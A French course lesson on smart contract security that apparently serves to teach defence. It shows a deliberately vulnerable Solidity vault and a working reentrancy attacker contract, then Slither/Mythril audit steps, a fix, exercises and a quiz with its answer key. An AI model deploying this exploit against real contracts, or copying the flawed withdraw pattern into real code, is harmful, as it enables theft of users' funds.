# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 219 (6h) : Sécurité des Contrats Intelligents & Blockchain (Smart Contracts Vulnerabilities, Reentrancy Attack, Integer Overflow, Access Control & Audit Solidity avec Mythril)

> [!NOTE]
> **Objectif du jour :** Maîtriser l'évaluation de la sécurité des contrats intelligents (**Smart Contracts**) et des technologies Blockchain bancaires : compréhension de la **Machine Virtuelle Ethereum (EVM)**, analyse et exploitation des failles classiques en **Solidity** (attaque par réentrabilité / **Reentrancy Attack**, débordement d'entiers / **Integer Overflow**, faiblesses de contrôle d'accès), et utilisation des outils d'audit statique et dynamique (**Mythril**, **Slither**).
>
> **Compétences visées :** `SEC-06` (A) — Smart Contract Audit & Solidity Vulnerabilities | `SEC-04` (A) — Reentrancy Exploitation & Static Code Analysis Slither/Mythril

---

## 1) Module — EVM & Vulnérabilités des Smart Contracts Solidity (2h)

### 📖 Narration/Intuition

Dans le cadre du développement de la monnaie numérique de banque centrale (MNBC / CBDC) ou de l'automatisation des règlements interbancaires, la BCC utilise des technologies de grand livre distribué (**Blockchain / Distributed Ledger**) et des **Smart Contracts** écrits en langage **Solidity**.

Un **Smart Contract** est un programme immuable exécuté sur la Blockchain. Une fois déployé sur le réseau, **son code ne peut plus être modifié**. Si le contrat contient une faille de sécurité, des millions de dollars peuvent être dérobés par un attaquant sans possibilité d'annuler les transactions.

### 🔍 Anatomie Technique

**Fonctionnement de l'EVM & Contrat Vulnerable Solidity :**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 🚨 CONTRAT BANCAIRE VULNÉRABLE (Attaque par Réentrabilité)
contract VaultVuln {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // ⚠️ VULNÉRABILITÉ DE RÉENTRABILITÉ (Reentrancy)
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0, "Solde insuffisant");

        // 🚨 ERREUR CRITIQUE : Envoi de l'argent AVANT la mise à jour du solde !
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Echec envoi");

        // La mise à jour du solde intervient TROP TARD
        balances[msg.sender] = 0;
    }
}
```

---

## 2) Module — Attaque par Réentrabilité (Reentrancy Attack) (2h)

### 📖 Narration/Intuition

L'attaque par **Réentrabilité (Reentrancy)** est la vulnérabilité la plus célèbre de l'histoire de la Blockchain (à l'origine du hack de The DAO en 2016 ayant entraîné le vol de 60 millions de dollars).

Lorsqu'un contrat vulnérable envoie des fonds via `msg.sender.call{value: amount}("")`, le contrôle de l'exécution est transféré au contrat récepteur. Si le contrat de l'attaquant contient une fonction de fallback (`fallback()` ou `receive()`), cette fonction rappelle immédiatement la méthode `withdraw()` **AVANT** que le premier contrat n'ait eu le temps de mettre son solde à zéro !

### 🔍 Anatomie Technique

**Contrat d'Attaque par Réentrabilité (`AttackerContract.sol`) :**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVaultVuln {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVaultVuln public targetVault;

    constructor(address _vaultAddress) {
        targetVault = IVaultVuln(_vaultAddress);
    }

    // 1. Fonction Fallback déclenchée automatiquement lors de la réception d'Ether/Tokens
    receive() external payable {
        if (address(targetVault).balance >= 1 ether) {
            // 🚨 RÉENTRABILITÉ : Rappeler withdraw() en boucle tant qu'il reste des fonds !
            targetVault.withdraw();
        }
    }

    // 2. Déclencheur de l'attaque
    function attack() external payable {
        require(msg.value >= 1 ether);
        targetVault.deposit{value: 1 ether}();
        targetVault.withdraw(); // Déclenche la boucle de réentrabilité !
    }
}
```

---

## 3) Module — Audit de Code & Audit Automatisé (Slither & Mythril) (2h)

### 📖 Narration/Intuition

Avant tout déploiement d'un Smart Contract sur un réseau Blockchain bancaire, le code Solidity doit être soumis à une série d'analyses statiques et dynamiques automatisées avec des outils spécialisés (**Slither**, **Mythril**).

### 🛠️ Atelier Pratique

**Audit Statique & Symbolique de Smart Contracts (`audit_commands.sh`) :**

```bash
# 1. Installer Slither (Framework d'analyse statique Python pour Solidity)
pip3 install slither-analyzer

# 2. Exécuter Slither sur le contrat Solidity
slither VaultVuln.sol

# Output Slither :
# 🔴 Reentrancy in VaultVuln.withdraw() (VaultVuln.sol#11-18):
#    External calls: (sent,None) = msg.sender.call{value: bal}() (VaultVuln.sol#15)
#    State variables written after the call: balances[msg.sender] = 0 (VaultVuln.sol#17)
#    Reference: https://swcregistry.io/docs/SWC-107

# 3. Exécuter Mythril (Moteur d'exécution symbolique pour EVM)
myth analyze VaultVuln.sol
```

**Remédiation : Le Pattern Checks-Effects-Interactions & Mutex ReentrancyGuard :**

```solidity
// ✅ CONTRAT SÉCURISÉ (Checks-Effects-Interactions Pattern)
contract VaultSecured {
    mapping(address => uint) public balances;
    bool private locked;

    // Modificateur ReentrancyGuard (Mutex)
    modifier noReentrant() {
        require(!locked, "Reentrancy detectee");
        locked = true;
        _;
        locked = false;
    }

    function withdraw() public noReentrant {
        // 1. CHECKS (Vérifications)
        uint bal = balances[msg.sender];
        require(bal > 0, "Solde insuffisant");

        // 2. EFFECTS (Mise à jour de l'état interne D'ABORD !)
        balances[msg.sender] = 0;

        // 3. INTERACTIONS (Appel externe EN DERNIER)
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Echec envoi");
    }
}
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **EVM** | Ethereum Virtual Machine — Environnement d'exécution des Smart Contracts |
| **SWC** | Smart Contract Weakness Classification — Registre des vulnérabilités Solidity |
| **CBDC** | Central Bank Digital Currency — Monnaie Numérique de Banque Centrale (MNBC) |
| **ABI** | Application Binary Interface — Interface binaire de communication avec un Smart Contract |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Expliquer le fonctionnement du pattern **Checks-Effects-Interactions** en Solidity et pourquoi il prévient naturellement les attaques par réentrabilité.

**Corrigé :** Le pattern **Checks-Effects-Interactions** impose un ordre strict lors de l'écriture d'une fonction Solidity modifiant un état et effectuant un transfert de fonds : (1) **Checks** : Effectuer toutes les vérifications de pré-conditions via des `require()` (ex: vérifier le solde). (2) **Effects** : Modifier les variables d'état internes de la BDD Blockchain **AVANT** d'interagir avec l'extérieur (ex: remettre le solde de l'utilisateur à zéro `balances[msg.sender] = 0`). (3) **Interactions** : Effectuer l'appel externe ou le transfert de jetons (`msg.sender.call`) **en tout dernier**. Si l'attaquant tente de réentrer dans la fonction via sa fonction `receive()`, lors du deuxième appel, l'étape 1 (Checks) lira le solde réinitialisé à 0 lors de l'étape 2 (Effects) du premier appel, et l'instruction `require(bal > 0)` échouera immédiatement, bloquant l'attaque.

**Exercice 2 :** Pourquoi la réécriture de contrats Solidity avec la version du compilateur `pragma solidity ^0.8.0` a-t-elle éliminé les vulnérabilités de type **Integer Overflow / Underflow** par défaut ?

**Corrigé :** Avant la version 0.8.0 de Solidity, les opérations arithmétiques sur les entiers (ex: `uint8` qui va de 0 à 255) ne vérifiaient pas les dépassements de capacité. Si une variable de valeur 255 recevait `+ 1`, la valeur s'enroulait (overflow) et devenait `0` sans lever d'erreur. De même, `0 - 1` devenait `255` (underflow). Les développeurs devaient utiliser la bibliothèque externe `SafeMath` (`using SafeMath for uint256;`). Depuis la version **Solidity 0.8.0**, le compilateur intègre des **vérifications d'arithmétique vérifiée (Checked Arithmetic)** par défaut au niveau de l'EVM : toute opération provoquant un dépassement de capacité entraîne automatiquement un `revert` immédiat de la transaction, éliminant cette classe entière de failles sans nécessiter de bibliothèque externe.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quelle vulnérabilité Solidity de réentrabilité (SWC-107) a été responsable du hack historique de The DAO en 2016 ?
- A) Reentrancy Attack
- B) SQL Injection
- C) XSS
- D) Buffer Overflow

**Réponse : A**

**Q2 :** Dans la bonne pratique de développement Solidity **Checks-Effects-Interactions**, à quel moment les variables d'état du contrat (ex: `balances[msg.sender] = 0`) doivent-elles être mises à jour ?
- A) AVANT tout appel externe ou transfert de fonds à une adresse cliente
- B) Après l'appel externe
- C) À la fin du bloc de transaction uniquement
- D) Les variables d'état ne doivent jamais être modifiées

**Réponse : A**

**Q3 :** Quel outil open-source d'analyse statique de code Python permet de scanner un contrat Solidity et de détecter automatiquement des vulnérabilités telles que la réentrabilité ou le manque de contrôles d'accès ?
- A) Slither
- B) Nmap
- C) Wireshark
- D) Docker

**Réponse : A**

**Q4 :** Depuis quelle version du compilateur Solidity (0.8.0+) les vérifications d'arithmétique (Integer Overflow / Underflow) sont-elles intégrées nativement sans nécessiter la bibliothèque SafeMath ?
- A) Solidity 0.8.0
- B) Solidity 0.4.12
- C) Solidity 0.5.0
- D) Solidity 0.6.12

**Réponse : A**

**Q5 :** Dans un contrat Solidity, quel modificateur de fonction personnalisé (ou ReentrancyGuard) permet de verrouiller l'exécution d'une fonction pendant son déroulement pour empêcher tout rappel réentrant ?
- A) A Mutex / `noReentrant` modifier
- B) `public`
- C) `payable`
- D) `view`

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
